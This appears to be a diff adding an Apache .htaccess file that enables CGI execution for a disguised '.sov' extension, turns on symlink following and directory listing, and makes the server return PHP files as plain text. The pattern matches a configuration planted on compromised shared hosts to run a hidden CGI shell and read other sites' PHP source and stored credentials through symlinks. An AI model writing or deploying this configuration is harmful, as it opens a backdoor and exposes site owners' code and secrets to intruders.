@@ -1,0 +1,7 @@
+Options +ExecCGI
+AddHandler cgi-script cgi pl sov
+Options +FollowSymLinks 
+DirectoryIndex seees.html 
+Options +Indexes
+RemoveHandler .php
+AddType text/plain .php
